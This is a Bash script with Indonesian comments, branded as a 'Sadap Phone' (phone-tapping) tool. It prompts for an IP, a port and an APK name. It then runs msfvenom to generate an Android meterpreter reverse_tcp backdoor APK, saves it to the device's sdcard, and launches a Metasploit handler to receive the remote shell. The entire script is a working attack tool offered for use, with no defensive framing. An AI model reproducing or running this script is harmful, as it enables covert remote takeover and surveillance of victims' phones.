#!/bin/bash
# Saya Masih Belajar Membuat Script
# Dilarang Keras Recorde Script Gua gw cape goblk buatnya...
#Lu tinggal pake Apa susahnya sih..
# Gw masih Noob Coeg
#Gw yg masih Script Kiddie aja  bisa membuat script
#Salam NewBie

clear
BB='\033[34;1m'
GG='\033[32;1m'
PP='\033[35;1m'
CC='\033[36;1m'
RR='\033[31;1m'
WW='\033[37;1m'


program1(){
         echo $PP"Masukan Nama Anda:?"
         read nama
         echo $PP"Selamat Datang $nama Di Tools Sadap Phone"
         echo
         echo $RR"Ingin Lanjutkan y/n:?"
         read pill
         if [ $pill = "y" ];then
              clear
              echo $RR"Loading..."
              clear
              sleep 1
         else
            echo "kesalahan"
            exit
         fi
}



program2(){
         figlet Sadap Phone | lolcat
         echo $CC"[+]================================[+]"
         echo $CC" AUTHOR   : NOOb ARJUN"
         echo $CC" TEAM     : GOMBONG EROR SYSTEM"
         echo $CC" Facebook : Noobz Mastah"
         echo $CC" Contacts : 083869752666"
         echo $CC" Thank's  : MR.Crot"
         echo $CC"[+]================================[+]"
}



program3(){
         echo
         echo
         echo
         echo $BB"Masukan Port Ganteng:"
         read port
         echo
         echo $BB"Masukan Ip Ganteng:"
         read ip
         echo
         echo $BB"Masukan Nama Backdoor Contoh : Test.apk"
         read apk
         echo
         echo $PP" Loading..."
         sleep 1
         clear
         echo $WW"[+]================================[+]"
         echo $WW"[+]           NOOB ARJUN           [+]"
         echo $WW"[+]================================[+]"
         echo "     port : $port" | lolcat
         echo "     ip   : $ip" | lolcat
         echo "     apk  : $apk" | lolcat
         echo $WW"[+]================================[+]"
         echo
         echo
}

program4(){
         echo $BB"Sedang Membuat Backdoor Mohon Sabar Ganteng:v"
         echo $BB"Loading.."
         sleep 2
         msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /sdcard/$apk
         echo
         echo $PP"Backdor Telah Terbuat Dan Tersimpan Di sdcard anda:v"
         echo
         echo $PP"Ingin Lanjut y/n?"
         read pill
         if [ $pill = "y" ];then
              clear
              echo "Loading..."
         else
            echo $PP"Kesalahan"
            exit
         fi
}

program5(){
         echo $GG"Sedang Mempersiap Metasploit .."
         echo $CC"Sabar Yah Orang Sabar Di Sayang Janda:v"
         sleep 1
         msfconsole -q -x "use exploit/multi/handler;
         set payload android/meterpreter/reverse_tcp;
         set LHOST $ip;
         set LPORT $port;
         exploit"
}
program1
program2
program3
program4
program5
